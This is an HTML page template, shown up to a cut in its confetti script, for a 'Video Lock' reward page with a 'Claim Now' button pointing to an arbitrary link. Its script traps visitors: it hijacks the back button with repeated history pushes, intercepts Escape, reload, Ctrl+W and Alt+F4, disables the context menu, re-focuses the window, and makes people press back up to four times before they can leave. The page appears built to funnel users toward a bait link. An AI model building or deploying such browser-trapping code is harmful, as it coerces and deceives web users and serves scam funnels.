<!DOCTYPE html>
<html>
<head>
    <title>Video Lock</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: #0a0a1a;
            color: #fff;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            position: fixed;
            top: 0;
            left: 0;
            display: flex;
            flex-direction: column;
            padding: 12px;
            touch-action: none;
            user-select: none;
            -webkit-user-select: none;
        }

        .bg-glow {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80vw;
            height: 80vw;
            background: radial-gradient(circle, rgba(102, 126, 234, 0.12) 0%, transparent 70%);
            z-index: 0;
            animation: pulseGlow 3s ease-in-out infinite;
        }

        @keyframes pulseGlow {
            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
            50% { transform: translate(-50%, -50%) scale(1.1); opacity: 1; }
        }

        .top-section {
            position: relative;
            z-index: 1;
            flex: 0 0 auto;
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
            padding: 0 0 6px 0;
        }

        .video-wrapper {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 16px;
            border: 2px solid rgba(102, 126, 234, 0.2);
            box-shadow: 0 0 40px rgba(102, 126, 234, 0.06);
            padding: 8px;
            backdrop-filter: blur(10px);
            animation: fadeInUp 0.8s ease;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px) scale(0.97); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }

        .video-container {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            border: 2px solid rgba(102, 126, 234, 0.1);
        }

        .video-container iframe,
        .video-container video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            background: #000;
        }

        .video-container iframe {
            z-index: 5;
        }

        .video-container::before {
            content: '';
            position: absolute;
            top: -3px;
            left: -3px;
            right: -3px;
            bottom: -3px;
            border-radius: 14px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.25), rgba(118, 75, 162, 0.25), rgba(102, 126, 234, 0.25));
            z-index: -1;
            animation: borderGlow 3s ease-in-out infinite;
        }

        @keyframes borderGlow {
            0%, 100% { opacity: 0.4; }
            50% { opacity: 1; }
        }

        .video-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
            background: transparent;
            cursor: default;
            touch-action: none;
        }

        .headline {
            text-align: center;
            margin: 10px 0 4px;
            font-size: 17px;
            font-weight: 700;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: fadeIn 1s ease;
            letter-spacing: 0.5px;
            opacity: 0;
            transition: opacity 0.5s ease;
        }
        .headline.show { opacity: 1; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* ===== CLAIM BUTTON - ALWAYS VISIBLE ===== */
        .claim-btn-wrapper {
            display: flex;
            justify-content: center;
            margin-top: 4px;
            animation: fadeIn 1.2s ease;
            opacity: 0;
            transition: opacity 0.5s ease;
            z-index: 999999;
            position: relative;
        }
        .claim-btn-wrapper.show { opacity: 1; }

        .claim-btn {
            padding: 14px 60px;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer !important;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #fff;
            transition: all 0.3s ease;
            position: relative;
            letter-spacing: 1px;
            box-shadow: 0 0 30px rgba(102, 126, 234, 0.25);
            border: 2px solid rgba(255, 255, 255, 0.06);
            width: 100%;
            max-width: 400px;
            touch-action: manipulation;
            -webkit-tap-highlight-color: transparent;
            z-index: 999999 !important;
            pointer-events: auto !important;
        }

        .claim-btn:hover {
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 0 50px rgba(102, 126, 234, 0.4);
        }

        .claim-btn:active {
            transform: scale(0.97);
        }

        .claim-btn::before {
            content: '';
            position: absolute;
            top: -4px;
            left: -4px;
            right: -4px;
            bottom: -4px;
            border-radius: 54px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.4), rgba(118, 75, 162, 0.4), rgba(102, 126, 234, 0.4));
            z-index: -1;
            animation: btnGlow 2s ease-in-out infinite;
            filter: blur(10px);
        }

        @keyframes btnGlow {
            0%, 100% { opacity: 0.4; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.04); }
        }

        .claim-btn .ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: scale(0);
            animation: rippleAnim 0.6s linear;
            pointer-events: none;
        }

        @keyframes rippleAnim {
            to { transform: scale(4); opacity: 0; }
        }

        /* ===== POPUP OVERLAY ===== */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1000;
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.6s ease, visibility 0.6s ease;
            cursor: pointer;
        }
        .popup-overlay.show {
            opacity: 1;
            visibility: visible;
        }
        .popup-overlay.hidden {
            opacity: 0;
            visibility: hidden;
        }

        .popup-card {
            background: rgba(20, 20, 50, 0.95);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border-radius: 28px;
            padding: 24px 20px 28px;
            max-width: 380px;
            width: 92%;
            border: 2px solid rgba(102, 126, 234, 0.4);
            box-shadow: 0 0 80px rgba(102, 126, 234, 0.2), inset 0 0 80px rgba(102, 126, 234, 0.05);
            animation: popIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            overflow: hidden;
            cursor: pointer;
        }
        .popup-card::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            border-radius: 30px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.4), rgba(118, 75, 162, 0.4), rgba(102, 126, 234, 0.4));
            z-index: -1;
            animation: borderPulse 3s ease-in-out infinite;
        }
        @keyframes borderPulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
        @keyframes popIn {
            0% { opacity: 0; transform: scale(0.8) translateY(40px) rotate(-3deg); }
            60% { opacity: 1; transform: scale(1.02) translateY(-5px) rotate(0.5deg); }
            100% { opacity: 1; transform: scale(1) translateY(0) rotate(0deg); }
        }

        .popup-card .popup-image {
            width: 100%;
            aspect-ratio: 16/9;
            border-radius: 16px;
            overflow: hidden;
            background: #1a1a3a;
            border: 2px solid rgba(255, 255, 255, 0.08);
            margin-bottom: 16px;
        }
        .popup-card .popup-image img { width: 100%; height: 100%; object-fit: cover; display: block; }
        .popup-card .popup-image .placeholder {
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            color: rgba(255, 255, 255, 0.15);
            background: linear-gradient(135deg, #1a1a3a, #2a2a5a);
        }

        .popup-card .popup-title {
            text-align: center;
            font-size: 20px;
            font-weight: 800;
            color: #fff;
            margin-bottom: 4px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            pointer-events: none;
        }
        .popup-card .popup-sub {
            text-align: center;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.4);
            margin-bottom: 16px;
            pointer-events: none;
        }

        .popup-card .popup-claim-btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 700;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #fff;
            position: relative;
            box-shadow: 0 0 40px rgba(102, 126, 234, 0.25);
            cursor: pointer !important;
            pointer-events: auto !important;
            opacity: 1;
            text-align: center;
            display: block;
            margin-top: 4px;
        }
        .popup-card .popup-claim-btn::before {
            content: '';
            position: absolute;
            top: -4px;
            left: -4px;
            right: -4px;
            bottom: -4px;
            border-radius: 18px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.4), rgba(118, 75, 162, 0.4), rgba(102, 126, 234, 0.4));
            z-index: -1; animation: btnGlow 2s ease-in-out infinite; filter: blur(10px);
        }
        .popup-card .popup-claim-btn:hover { transform: translateY(-2px); box-shadow: 0 0 50px rgba(102, 126, 234, 0.4); }
        .popup-card .popup-claim-btn:active { transform: scale(0.97); }

        /* ===== CONFETTI CELEBRATION ===== */
        .confetti-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 999;
            pointer-events: none;
            overflow: hidden;
        }
        .confetti-container.active { pointer-events: none; }

        .confetti-piece {
            position: absolute;
            width: 10px;
            height: 14px;
            animation: confettiFall linear forwards;
            pointer-events: none;
            opacity: 1;
            will-change: transform, opacity;
            backface-visibility: hidden;
            -webkit-backface-visibility: hidden;
        }
        @keyframes confettiFall {
            0% { opacity: 1; transform: translateY(-20px) rotate(0deg) scale(0.8); }
            20% { opacity: 1; transform: translateY(20vh) rotate(72deg) scale(1.1); }
            50% { opacity: 1; transform: translateY(50vh) rotate(180deg) scale(1.3); }
            80% { opacity: 0.9; transform: translateY(80vh) rotate(288deg) scale(1.1); }
            100% { opacity: 0; transform: translateY(110vh) rotate(360deg) scale(0.6); }
        }

        .confetti-burst-piece {
            position: absolute;
            width: 8px;
            height: 12px;
            animation: confettiBurst 1.5s cubic-bezier(0.2, 0.8, 0.4, 1) forwards;
            pointer-events: none;
            opacity: 0;
            will-change: transform, opacity;
            backface-visibility: hidden;
            -webkit-backface-visibility: hidden;
        }
        @keyframes confettiBurst {
            0% { opacity: 1; transform: translate(0, 0) scale(0.3) rotate(0deg); }
            35% { opacity: 1; transform: translate(var(--tx), var(--ty)) scale(1.3) rotate(180deg); }
            70% { opacity: 0.8; transform: translate(var(--tx2), var(--ty2)) scale(0.9) rotate(300deg); }
            100% { opacity: 0; transform: translate(var(--tx3), var(--ty3)) scale(0.4) rotate(400deg); }
        }

        .sound-toggle {
            position: fixed;
            bottom: 80px;
            right: 20px;
            z-index: 1001;
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            cursor: pointer;
            backdrop-filter: blur(10px);
            transition: 0.3s;
            color: #fff;
        }
        .sound-toggle:hover { background: rgba(255,255,255,0.2); transform: scale(1.1); }

        .chat-section {
            position: relative;
            z-index: 1;
            flex: 1;
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
            min-height: 0;
            overflow: hidden;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(5px);
            animation: fadeInUp 1s ease;
            margin-top: 4px;
            opacity: 0;
            transition: opacity 0.5s ease;
        }
        .chat-section.show { opacity: 1; }

        .chat-section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 40px;
            background: linear-gradient(to bottom, #0a0a1a, transparent);
            z-index: 10;
            pointer-events: none;
        }

        .chat-section::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 30px;
            background: linear-gradient(to top, #0a0a1a, transparent);
            z-index: 10;
            pointer-events: none;
        }

        .chat-container {
            width: 100%;
            height: 100%;
            position: relative;
            overflow-y: auto;
            overflow-x: hidden;
            padding: 8px 14px;
            padding-top: 30px;
            padding-bottom: 20px;
            scroll-behavior: smooth;
        }

        .chat-messages {
            display: flex;
            flex-direction: column;
            gap: 5px;
            padding-bottom: 8px;
        }

        .chat-message {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 7px 12px;
            background: rgba(255, 255, 255, 0.04);
            border-radius: 10px;
            border-left: 3px solid rgba(102, 126, 234, 0.15);
            font-size: 13px;
            opacity: 0;
            transform: translateY(15px) scale(0.95);
            animation: fadeInUpChat 0.4s ease forwards;
            transition: opacity 0.6s ease, transform 0.6s ease;
            will-change: transform, opacity;
        }

        @keyframes fadeInUpChat {
            from {
                opacity: 0;
                transform: translateY(15px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .chat-message.fade-out {
            opacity: 0 !important;
            transform: translateY(-20px) scale(0.9) !important;
            pointer-events: none;
            transition: opacity 0.8s ease, transform 0.8s ease;
        }

        .chat-message .avatar {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 13px;
            flex-shrink: 0;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #fff;
            font-weight: 700;
            text-transform: uppercase;
        }

        .chat-message .username {
            font-weight: 600;
            color: rgba(255, 255, 255, 0.9);
            font-size: 12px;
            white-space: nowrap;
            min-width: 50px;
        }

        .chat-message .text {
            color: rgba(255, 255, 255, 0.75);
            font-size: 12px;
            font-weight: 300;
            word-break: break-word;
            flex: 1;
        }

        .chat-message .time {
            color: rgba(255, 255, 255, 0.2);
            font-size: 9px;
            margin-left: 4px;
            white-space: nowrap;
            font-weight: 300;
        }

        .emoji-picker-wrapper {
            position: sticky;
            bottom: 8px;
            z-index: 20;
            display: flex;
            justify-content: flex-end;
            padding-right: 6px;
            margin-top: auto;
        }

        .emoji-picker-btn {
            background: rgba(102, 126, 234, 0.2);
            border: 1px solid rgba(102, 126, 234, 0.3);
            border-radius: 50%;
            width: 44px;
            height: 44px;
            font-size: 20px;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            backdrop-filter: blur(10px);
            position: relative;
        }

        .emoji-picker-btn:hover {
            background: rgba(102, 126, 234, 0.4);
            transform: scale(1.1);
        }

        .emoji-picker-btn .emoji-list {
            position: absolute;
            bottom: 55px;
            right: 0;
            background: rgba(20, 20, 40, 0.95);
            border-radius: 12px;
            padding: 8px;
            display: none;
            gap: 4px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            flex-wrap: wrap;
            width: 160px;
            justify-content: center;
        }

        .emoji-picker-btn .emoji-list.open {
            display: flex;
        }

        .emoji-picker-btn .emoji-list span {
            font-size: 24px;
            cursor: pointer;
            padding: 4px 6px;
            border-radius: 6px;
            transition: 0.3s;
        }

        .emoji-picker-btn .emoji-list span:hover {
            background: rgba(102, 126, 234, 0.3);
            transform: scale(1.2);
        }

        ::-webkit-scrollbar {
            width: 3px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb {
            background: rgba(102, 126, 234, 0.2);
            border-radius: 4px;
        }

        .flying-reaction {
            position: fixed;
            font-size: 28px;
            z-index: 4;
            pointer-events: none;
            animation: flyUpSmooth 2.8s cubic-bezier(0.2, 0.8, 0.4, 1) forwards;
            will-change: transform, opacity;
        }

        @keyframes flyUpSmooth {
            0% {
                opacity: 0;
                transform: translateY(0) scale(0.3) rotate(0deg);
            }
            15% {
                opacity: 1;
                transform: translateY(-30px) scale(1.2) rotate(8deg);
            }
            40% {
                opacity: 1;
                transform: translateY(-100px) scale(1.0) rotate(-5deg);
            }
            70% {
                opacity: 0.8;
                transform: translateY(-200px) scale(0.8) rotate(10deg);
            }
            100% {
                opacity: 0;
                transform: translateY(-320px) scale(0.4) rotate(-8deg);
            }
        }

        .flying-reaction.type-1 { animation-duration: 2.5s; }
        .flying-reaction.type-2 { animation-duration: 3.2s; }
        .flying-reaction.type-3 { animation-duration: 2.8s; }

        @media (max-width: 600px) {
            body { padding: 8px; }
            .video-wrapper { padding: 5px; border-radius: 12px; }
            .video-container { border-radius: 8px; }
            .video-container::before { border-radius: 10px; }
            .headline { font-size: 14px; margin: 6px 0 3px; }
            .claim-btn { padding: 12px 40px; font-size: 16px; max-width: 100%; }
            .claim-btn::before { border-radius: 40px; }
            .popup-card { padding: 18px 16px 22px; max-width: 340px; }
            .popup-card .popup-title { font-size: 17px; }
            .popup-card .popup-claim-btn { font-size: 16px; padding: 12px; }
            .chat-section { border-radius: 8px; margin-top: 2px; }
            .chat-message { padding: 5px 10px; font-size: 11px; gap: 6px; }
            .chat-message .avatar { width: 26px; height: 26px; font-size: 11px; }
            .chat-message .username { font-size: 10px; min-width: 40px; }
            .chat-message .text { font-size: 10px; }
            .chat-message .time { font-size: 8px; }
            .chat-container { padding: 6px 10px; padding-top: 25px; padding-bottom: 15px; }
            .flying-reaction { font-size: 22px; }
            .emoji-picker-btn { width: 38px; height: 38px; font-size: 16px; }
            .emoji-picker-btn .emoji-list { width: 140px; bottom: 48px; }
            .emoji-picker-btn .emoji-list span { font-size: 20px; }
            .confetti-piece { width: 8px; height: 10px; }
            .confetti-burst-piece { width: 6px; height: 9px; }
            .sound-toggle { width: 34px; height: 34px; font-size: 15px; bottom: 70px; right: 14px; }
        }

        @media (max-width: 400px) {
            .headline { font-size: 12px; }
            .claim-btn { padding: 10px 30px; font-size: 14px; max-width: 100%; }
            .popup-card { padding: 14px 12px 18px; max-width: 300px; }
            .popup-card .popup-title { font-size: 15px; }
            .popup-card .popup-claim-btn { font-size: 14px; padding: 10px; }
            .chat-message { padding: 4px 8px; font-size: 10px; gap: 4px; }
            .chat-message .avatar { width: 22px; height: 22px; font-size: 9px; }
            .chat-message .username { font-size: 9px; min-width: 35px; }
            .chat-message .text { font-size: 9px; }
            .chat-message .time { font-size: 7px; }
            .chat-container { padding: 4px 6px; padding-top: 20px; padding-bottom: 12px; }
            .flying-reaction { font-size: 18px; }
            .emoji-picker-btn { width: 32px; height: 32px; font-size: 14px; }
            .emoji-picker-btn .emoji-list { width: 120px; bottom: 42px; }
            .emoji-picker-btn .emoji-list span { font-size: 16px; }
            .confetti-piece { width: 6px; height: 8px; }
            .confetti-burst-piece { width: 5px; height: 7px; }
            .sound-toggle { width: 30px; height: 30px; font-size: 13px; bottom: 60px; right: 10px; }
        }

        :-webkit-full-screen .video-container { border-radius: 0; }
        :-webkit-full-screen .video-wrapper { border-radius: 0; padding: 0; border: none; box-shadow: none; background: transparent; }
        :-webkit-full-screen .video-container::before { display: none; }
        :-webkit-full-screen .top-section { max-width: 100%; }
        :-webkit-full-screen .chat-section { max-width: 100%; border-radius: 0; }
    </style>
</head>
<body>

    <div class="bg-glow"></div>

    <div class="top-section">
        <div class="video-wrapper">
            <div class="video-container" id="videoContainer">
                <div id="videoPlayer">
                    <!-- Video will be inserted here -->
                </div>
                <div class="video-overlay" id="videoOverlay"></div>
            </div>
            <div class="headline" id="headline">🎬 Watch Video</div>
            <div class="claim-btn-wrapper" id="claimBtnWrapper">
                <button class="claim-btn" id="claimBtn">🎁 Claim Now</button>
            </div>
        </div>
    </div>

    <div class="chat-section" id="chatSection">
        <div class="chat-container" id="chatContainer">
            <div class="chat-messages" id="chatMessages"></div>
            <div class="emoji-picker-wrapper">
                <div class="emoji-picker-btn" id="emojiPickerBtn" onclick="toggleEmojiPicker()">
                    😊
                    <div class="emoji-list" id="emojiList">
                        <span onclick="triggerReaction('🥳', event)">🥳</span>
                        <span onclick="triggerReaction('🤩', event)">🤩</span>
                        <span onclick="triggerReaction('😍', event)">😍</span>
                        <span onclick="triggerReaction('😎', event)">😎</span>
                        <span onclick="triggerReaction('😮', event)">😮</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ===== POPUP OVERLAY ===== -->
    <div class="popup-overlay" id="popupOverlay">
        <div class="popup-card" id="popupCard">
            <div class="popup-image" id="popupImage">
                <div class="placeholder" id="popupPlaceholder">🎬</div>
                <img id="popupImg" style="display:none;" alt="Popup Image">
            </div>
            <div class="popup-title" id="popupTitle">🎁 Claim Your Reward</div>
            <div class="popup-sub" id="popupSub">Tap anywhere to unlock your reward</div>
            <button class="popup-claim-btn" id="popupClaimBtn">🎁 Claim Now</button>
        </div>
    </div>

    <!-- ===== CONFETTI CELEBRATION ===== -->
    <div class="confetti-container" id="confettiContainer"></div>

    <!-- ===== SOUND TOGGLE ===== -->
    <button class="sound-toggle" id="soundToggle" onclick="toggleSound()">🔊</button>

    <script>
        // ==================== GET LINK ID ====================
        const pathSegments = window.location.pathname.split('/');
        const linkId = pathSegments[pathSegments.length - 1] || 'default';

        // ==================== PARAMS ====================
        const urlParams = new URLSearchParams(window.location.search);
        let videoUrl = urlParams.get('video') || localStorage.getItem('videoUrl') || 'https://youtu.be/dQw4w9WgXcQ';
        const claimUrl = urlParams.get('claim') || localStorage.getItem('claimUrl') || '#';
        const buttonText = urlParams.get('btn') || localStorage.getItem('buttonText') || 'Claim Now';
        const headline = urlParams.get('headline') || localStorage.getItem('headline') || '🎬 Watch Video';

        document.getElementById('headline').textContent = headline;
        document.getElementById('claimBtn').textContent = buttonText || '🎁 Claim Now';
        document.getElementById('popupClaimBtn').textContent = buttonText || '🎁 Claim Now';

        // ==================== FIX YOUTUBE URL ====================
        function fixYouTubeUrl(url) {
            if (url.includes('youtube.com/watch?v=')) {
                const videoId = url.split('v=')[1].split('&')[0];
                return 'https://youtu.be/' + videoId;
            }
            if (url.includes('youtu.be/')) return url;
            if (url.includes('youtube.com/embed/')) return url;
            if (url.match(/^[a-zA-Z0-9_-]{11}$/)) return 'https://youtu.be/' + url;
            return url;
        }

        videoUrl = fixYouTubeUrl(videoUrl);
        console.log('🎬 Fixed YouTube URL:', videoUrl);

        // ==================== SCREEN LOCK ====================
        const overlay = document.getElementById('videoOverlay');
        overlay.addEventListener('touchstart', function(e) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }, { passive: false });

        overlay.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        });

        overlay.addEventListener('touchmove', function(e) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }, { passive: false });

        if (screen.orientation && screen.orientation.lock) {
            screen.orientation.lock('portrait').catch(function() {});
        }

        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });

        // ==================== SMART EXIT SYSTEM ====================
        let backPressCount = 0;
        let videoPlayCount = 0;
        let isUnlocked = false;
        let pageLoadTime = Date.now();
        let isExiting = false;
        let isVideoPlaying = false;
        let isPopupClaimed = false;
        let isSoundEnabled = true;

        function trackVideoPlay() {
            if (isVideoPlaying) return;
            videoPlayCount++;
            isVideoPlaying = true;
            console.log('🎬 Video play count:', videoPlayCount);
            if (videoPlayCount >= 2) {
                isUnlocked = true;
                console.log('✅ UNLOCKED after 2 video plays');
            }
        }

        function handleBackPress() {
            if (isExiting) return true;

            const timeElapsed = (Date.now() - pageLoadTime) / 1000;

            console.log('⬅️ Back press - Time:', timeElapsed.toFixed(1) + 's');

            if (isUnlocked) {
                console.log('🚪 Exiting (unlocked)');
                isExiting = true;
                document.body.innerHTML = '';
                window.location.href = 'about:blank';
                return true;
            }

            if (timeElapsed >= 180) {
                console.log('🚪 Exiting after 3+ minutes');
                isExiting = true;
                document.body.innerHTML = '';
                window.location.href = 'about:blank';
                return true;
            }

            backPressCount++;
            console.log('⬅️ Back press count:', backPressCount);

            if (backPressCount === 1) {
                showToast('Press back 3 more times to exit');
            } else if (backPressCount === 2) {
                showToast('2 more back presses to exit');
            } else if (backPressCount === 3) {
                showToast('1 more back press to exit');
            }

            if (backPressCount >= 4) {
                console.log('🚪 Exiting after 4 back presses');
                isExiting = true;
                document.body.innerHTML = '';
                window.location.href = 'about:blank';
                return true;
            }

            history.pushState(null, null, window.location.href);
            return false;
        }

        function showToast(msg) {
            const existing = document.querySelector('.toast-msg');
            if (existing) existing.remove();

            const toast = document.createElement('div');
            toast.className = 'toast-msg';
            toast.textContent = msg;
            toast.style.cssText = `
                position: fixed;
                bottom: 100px;
                left: 50%;
                transform: translateX(-50%);
                background: rgba(0,0,0,0.8);
                color: #fff;
                padding: 12px 24px;
                border-radius: 12px;
                font-size: 14px;
                z-index: 9999;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255,255,255,0.1);
                animation: fadeIn 0.3s ease;
                max-width: 90%;
                text-align: center;
                font-weight: 500;
            `;
            document.body.appendChild(toast);

            setTimeout(() => {
                if (toast.parentNode) toast.remove();
            }, 2000);
        }

        history.pushState(null, null, window.location.href);

        window.addEventListener('popstate', function(e) {
            handleBackPress();
        });

        document.addEventListener('keydown', function(e) {
            const isExitKey = e.key === 'Escape' || e.key === 'F5' || 
                (e.ctrlKey && (e.key === 'w' || e.key === 'r')) || 
                (e.altKey && e.key === 'F4') ||
                (e.metaKey && e.key === 'w');

            if (isExitKey) {
                e.preventDefault();
                e.stopPropagation();
                if (!isUnlocked) {
                    handleBackPress();
                } else {
                    isExiting = true;
                    document.body.innerHTML = '';
                    window.location.href = 'about:blank';
                }
                return false;
            }
        }, true);

        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        let touchStartX = 0;
        document.addEventListener('touchstart', function(e) {
            touchStartX = e.changedTouches[0].screenX;
        }, { passive: true });

        document.addEventListener('touchend', function(e) {
            const diff = touchStartX - e.changedTouches[0].screenX;
            if (diff > 80) {
                e.preventDefault();
                if (!isUnlocked) {
                    handleBackPress();
                }
                return false;
            }
        }, { passive: false });

        document.addEventListener('visibilitychange', function() {
            if (document.hidden && !isUnlocked) {
                setTimeout(function() { window.focus(); }, 50);
                handleBackPress();
            }
        });

        // ==================== SOUND TOGGLE ====================
        function toggleSound() {
            isSoundEnabled = !isSoundEnabled;
            document.getElementById('soundToggle').textContent = isSoundEnabled ? '🔊' : '🔇';
        }

        function playCelebrationSound() {
            if (!isSoundEnabled) return;
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const notes = [523.25, 587.33, 659.25, 783.99, 1046.50];
                notes.forEach((freq, index) => {
                    setTimeout(() => {
                        const osc = audioCtx.createOscillator();
                        const gain = audioCtx.createGain();
                        osc.connect(gain);
                        gain.connect(audioCtx.destination);
                        osc.frequency.value = freq;
                        osc.type = 'sine';
                        gain.gain.setValueAtTime(0.12, audioCtx.currentTime);
                        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.35);
                        osc.start(audioCtx.currentTime);
                        osc.stop(audioCtx.currentTime + 0.35);
                    }, index * 120);
                });
                setTimeout(() => {
                    const freqs = [523.25, 659.25, 783.99, 1046.50];
                    freqs.forEach((freq, i) => {
                        setTimeout(() => {
                            const osc = audioCtx.createOscillator();
                            const gain = audioCtx.createGain();
                            osc.connect(gain);
                            gain.connect(audioCtx.destination);
                            osc.frequency.value = freq;
                            osc.type = 'sine';
                            gain.gain.setValueAtTime(0.06, audioCtx.currentTime);
                            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.6);
                            osc.start(audioCtx.currentTime);
                            osc.stop(audioCtx.currentTime + 0.6);
                        }, i * 80);
                    });
                }, 550);
            } catch(e) {}
        }

        // ==================== CONFETTI CELEBRATION ====================
        function triggerCelebration() {
            if (isCelebrationActive) return;
            isCelebrationActive = true;
            const container = document.getElementById('confettiContainer');
            container.innerHTML = ''; container.classList.add('active');
            playCelebrationSound();

            const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff', '#ff9f43', '#00d2d3', '#ff4757', '#2ed573', '#f368e0', '#ff9ff3', '#54a0ff', '#5f27cd', '#ff6348', '#7bed9f', '#70a1ff', '#ff4757', '#2ed573', '#ffa502'];

            // Burst 1
            for (let i = 0; i < 60; i++) {
                const el = document.createElement('div');
                el.className = 'confetti-burst-piece';
                const color = colors[Math.floor(Math.random() * colors.length)];
                const w = 6 + Math.random() * 12, h = 8 + Math.random() * 14;
                el.style.width = w + 'px'; el.style.height = h + 'px';
                el.style.background = color;
                el.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
                const angle = Math.random() * 2 * Math.PI;
                const dist = 150 + Math.random() * 350;
                const tx = Math.cos(angle) * dist, ty = Math.sin(angle) * dist - 100;
                const tx2 = Math.cos(angle + 0.5) * (dist * 0.7), ty2 = Math.sin(angle + 0.5) * (dist * 0.7) - 50;
                const tx3 = Math.cos(angle + 0.8) * (dist * 0.3), ty3 = Math.sin(angle + 0.8) * (dist * 0.3) - 20;
                el.style.setProperty('--tx', tx + 'px'); el.style.setProperty('--ty', ty + 'px');
                el.style.setProperty('--tx2', tx2 + 'px'); el.style.setProperty('--ty2', ty2 + 'px');
                el.style.setProperty('--tx3', tx3 + 'px'); el.style.setProperty('--ty3', ty3 + 'px');
                el.style.left = (50 + Math.random() * 6 - 3) + '%';
                el.style.top = (45 + Math.random() * 10 - 5) + '%';
                el.style.animationDelay = (Math.random() * 0.15) + 's';
                el.style.transform = `rotate(${Math.random() * 360}deg)`;
                if (Math.random() > 0.7) el.style.boxShadow = `0 0 8px ${color}`;
                container.appendChild(el);
            }

            // Falling confetti
            for (let i = 0; i < 80; i++) {
                const el = document.createElement('div');
                el.className = 'confetti-piece';
                const color = colors[Math.floor(Math.random() * colors.length)];
                const w = 6 + Math.random() * 12, h = 8 + Math.random() * 14;
                el.style.width = w + 'px'; el.style.height = h + 'px';
                el.style.background = color;
                el.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
                el.style.left = Math.random() * 100 + '%';
                el.style.top = '-10%';
                el.style.animationDuration = (1.5 + Math.random() * 2) + 's';
                el.style.animationDelay = (Math.random() * 1.5) + 's';
                el.style.transform = `rotate(${Math.random() * 360}deg)`;
                if (Math.random() > 0.8) el.style.boxShadow = `0 0 10px ${color}`;
                container.appendChild(el);
            }

            // Burst 2
            setTimeout(() => {
